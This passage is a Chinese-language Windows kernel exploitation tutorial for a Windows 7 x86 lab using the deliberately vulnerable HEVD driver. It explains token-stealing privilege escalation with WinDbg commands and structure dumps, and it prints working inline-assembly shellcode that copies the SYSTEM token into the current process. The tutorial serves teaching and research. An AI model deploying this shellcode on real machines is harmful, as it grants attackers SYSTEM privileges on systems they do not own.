# 0x00：前言
最近重新开始了我的Windows内核之旅，这是我总结的Windows kernel
exploit系列的第一部分，从简单的UAF入手，第一篇我尽量写的详细一些，实验环境是Windows 7 x86
sp1，研究内核漏洞是一件令人兴奋的事情，希望能通过文章遇到更多志同道合的朋友，看此文章之前你需要有以下准备：
  * Windows 7 x86虚拟机
  * 配置好windbg等调试工具，建议配合VirtualKD使用
  * HEVD+OSR Loader配合构造漏洞环境
# 0x01：漏洞原理
## 提权原理
首先我们要明白一个道理，运行一个普通的程序在正常情况下是没有系统权限的，但是往往在一些漏洞利用中，我们会想要让一个普通的程序达到很高的权限就比如系统权限，下面做一个实验，我们在虚拟机中用普通权限打开一个cmd然后断下来，用`!dml_proc`命令查看当前进程的信息
    kd> !dml_proc
    Address  PID  Image file name
    865ce8a8 4    System         
    87aa9970 10c  smss.exe       
    880d4d40 164  csrss.exe      
    881e6200 198  wininit.exe    
    881e69e0 1a0  csrss.exe      
    ...
    87040ca0 bc0  cmd.exe
我们可以看到`System`的地址是 865ce8a8 ，`cmd`的地址是 87040ca0 ，我们可以通过下面的方式查看地址中的成员信息，这里之所以
+f8 是因为`token`的位置是在进程偏移为 0xf8
的地方，也就是`Value`的值，那么什么是`token`?你可以把它比做等级，不同的权限等级不同，比如系统权限等级是5级(最高)，那么普通权限就好比是1级，我们可以通过修改我们的等级达到系统的5级权限，这也就是提权的基本原理，如果我们可以修改进程的`token`为系统的`token`，那么就可以提权成功，我们手动操作一次下面是修改前`token`值的对比
    kd> dt nt!_EX_FAST_REF 865ce8a8+f8
       +0x000 Object           : 0x8a201275 Void
       +0x000 RefCnt           : 0y101
       +0x000 Value            : 0x8a201275 // system token
    kd> dt nt!_EX_FAST_REF 87040ca0+f8
       +0x000 Object           : 0x944a2c02 Void
       +0x000 RefCnt           : 0y010
       +0x000 Value            : 0x944a2c02 // cmd token
我们通过ed命令修改cmd token的值为system token
    kd> ed 87040ca0+f8 8a201275
    kd> dt nt!_EX_FAST_REF 87040ca0+f8
       +0x000 Object           : 0x8a201275 Void
       +0x000 RefCnt           : 0y101
       +0x000 Value            : 0x8a201275
用`whoami`命令发现权限已经变成了系统权限
我们将上面的操作变为汇编的形式如下
    void ShellCode()
    {
        _asm
        {
            nop
            nop
            nop
            nop
            pushad
            mov eax,fs:[124h]       // 找到当前线程的_KTHREAD结构
            mov eax, [eax + 0x50]    // 获取 nt!_KTHREAD.ApcState.Process 结构
            mov ecx, eax // 拷贝当前进程的_EPROCESS结构
            mov edx, 4    // edx = system PID(4)
            // 循环是为了获取system的_EPROCESS
        find_sys_pid:
            mov eax, [eax + 0xb8]   // 找到进程活动链表
            sub eax, 0xb8           // 链表遍历
            cmp [eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
            jnz find_sys_pid
            // 替换Token
            mov edx, [eax + 0xf8]
            mov [ecx + 0xf8], edx
            popad
            ret
        }
    }
解释一下上面的代码，fs寄存器在Ring0中指向一个称为KPCR的数据结构，即FS段的起点与 KPCR
结构对齐，而在Ring0中fs寄存器一般为0x30，这样fs:[124]就指向KPRCB数据结构的第四个字节。由于 KPRCB
结构比较大，在此就不列出来了。查看其数据结构可以看到第四个字节指向`CurrentThead`(KTHREAD类型)。这样fs:[124]其实是指向当前线程的`_KTHREAD`
    kd> dt nt!_KPCR
       +0x000 NtTib            : _NT_TIB
       +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
       +0x004 Used_StackBase   : Ptr32 Void
       +0x008 Spare2           : Ptr32 Void
       +0x00c TssCopy          : Ptr32 Void
       +0x010 ContextSwitches  : Uint4B
       +0x014 SetMemberCopy    : Uint4B
       +0x018 Used_Self        : Ptr32 Void
       +0x01c SelfPcr          : Ptr32 _KPCR
       +0x020 Prcb             : Ptr32 _KPRCB
       +0x024 Irql             : UChar
       +0x028 IRR              : Uint4B
       +0x02c IrrActive        : Uint4B
       +0x030 IDR              : Uint4B
       +0x034 KdVersionBlock   : Ptr32 Void
       +0x038 IDT              : Ptr32 _KIDTENTRY
       +0x03c GDT              : Ptr32 _KGDTENTRY
       +0x040 TSS              : Ptr32 _KTSS
       +0x044 MajorVersion     : Uint2B
       +0x046 MinorVersion     : Uint2B
       +0x048 SetMember        : Uint4B
       +0x04c StallScaleFactor : Uint4B
       +0x050 SpareUnused      : UChar
       +0x051 Number           : UChar
       +0x052 Spare0           : UChar
       +0x053 SecondLevelCacheAssociativity : UChar
       +0x054 VdmAlert         : Uint4B
       +0x058 KernelReserved   : [14] Uint4B
       +0x090 SecondLevelCacheSize : Uint4B
       +0x094 HalReserved      : [16] Uint4B
       +0x0d4 InterruptMode    : Uint4B
       +0x0d8 Spare1           : UChar
       +0x0dc KernelReserved2  : [17] Uint4B
       +0x120 PrcbData         : _KPRCB
再来看看`_EPROCESS`的结构，+0xb8处是进程活动链表，用于储存当前进程的信息，我们通过对它的遍历，可以找到system的`token`，我们知道system的PID一直是4，通过这一点我们就可以遍历了，遍历到系统`token`之后替换就行了
    kd> dt nt!_EPROCESS
       +0x000 Pcb              : _KPROCESS